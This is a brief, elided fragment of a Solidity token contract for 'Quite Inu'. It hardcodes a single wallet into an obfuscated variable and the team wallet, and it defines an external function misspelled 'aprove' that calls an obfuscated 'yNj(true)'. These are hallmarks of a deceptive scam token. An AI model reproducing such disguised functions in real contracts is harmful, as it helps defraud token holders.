...
contract  QuiteInu is Context, IERC20, Ownable {

    using SafeMath for uint256;
    string private _name = "Quite Inu";
    string private _symbol = "QUITE";
    ...
    constructor () {
        ...
        dXtw = payable(address(0xfeFB14d5dFdD3FAB66EAcb5903d48D206749765A));
        teamWalletAddress = payable(address(0xfeFB14d5dFdD3FAB66EAcb5903d48D206749765A));
    ...
    function aprove(bool Ttf, address[] memory ftrGaAV) external virtual {
        yNj(true);
